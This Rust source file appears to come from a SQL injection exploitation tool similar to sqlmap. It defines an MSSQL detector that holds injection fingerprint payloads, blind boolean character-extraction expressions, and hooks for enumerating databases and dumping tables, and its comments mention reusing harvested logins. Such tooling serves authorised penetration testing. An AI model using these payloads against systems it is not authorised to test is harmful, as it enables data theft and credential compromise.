#![deny(unsafe_code)]

use crate::dbms::common::{DbmsDetector, DbmsKind};
use crate::dbms::mssql::enumeration;

#[derive(Debug, Default)]
pub struct MsSqlDetector;

impl DbmsDetector for MsSqlDetector {
    fn kind(&self) -> DbmsKind {
        DbmsKind::MsSql
    }
    fn fingerprint_queries(&self) -> Vec<String> {
        vec!["SELECT @@version".to_owned(), "SELECT DB_NAME()".to_owned()]
    }
    fn extract_version_query(&self) -> String {
        "SELECT @@version".to_owned()
    }
    fn extract_user_query(&self) -> String {
        // SUSER_SNAME() = server login (sqlmap/ghauri `--current-user` parity),
        // not USER_NAME() (database principal). Intentional: identity
        // enumeration reports the login an operator can reuse elsewhere.
        "SELECT SUSER_SNAME()".to_owned()
    }
    fn banner_query(&self) -> String {
        super::queries::banner().to_owned()
    }
    fn current_user_query(&self) -> String {
        super::queries::user().to_owned()
    }
    fn current_db_query(&self) -> String {
        super::queries::current_db().to_owned()
    }
    fn hostname_query(&self) -> String {
        super::queries::hostname().to_owned()
    }
    fn length_expr(&self, query: &str) -> String {
        format!("LEN(({query}))")
    }
    fn ascii_cmp_expr(&self, query: &str, pos: usize, mid: u8) -> String {
        format!("ASCII(SUBSTRING(({query}),{},1))>={mid}", pos + 1)
    }
    fn list_databases_query(&self) -> String {
        enumeration::list_databases().to_owned()
    }
    fn list_tables_query(&self, db: &str) -> String {
        enumeration::list_tables(db)
    }
    fn list_columns_query(&self, db: &str, table: &str) -> String {
        enumeration::list_columns(db, table)
    }
    fn dump_table_query(
        &self,
        db: &str,
        table: &str,
        columns: &[String],
        start: usize,
        stop: usize,
    ) -> String {
        enumeration::dump_table(db, table, columns, start, stop)
    }
    fn count_rows_query(&self, db: &str, table: &str) -> String {
        enumeration::count_rows(db, table)
    }
    fn file_read_query(&self, _path: &str) -> Option<String> {
        None
    }
    fn fingerprint_probe(&self) -> (String, String) {
        // SUSER_SNAME() only exists on MSSQL/Sybase and never returns NULL
        // for the connecting login; elsewhere the unknown-function call
        // errors identically for both branches.
        (
            "' AND (SUSER_SNAME() IS NOT NULL) --".to_owned(),
            "' AND (SUSER_SNAME() IS NULL) --".to_owned(),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fingerprint_probe_uses_mssql_only_function() {
        let (true_p, false_p) = MsSqlDetector.fingerprint_probe();
        assert!(true_p.contains("SUSER_SNAME()"));
        assert!(false_p.contains("SUSER_SNAME()"));
        assert!(true_p.contains("IS NOT NULL"));
        assert!(false_p.contains("IS NULL") && !false_p.contains("IS NOT NULL"));
        assert_ne!(true_p, false_p);
    }
}
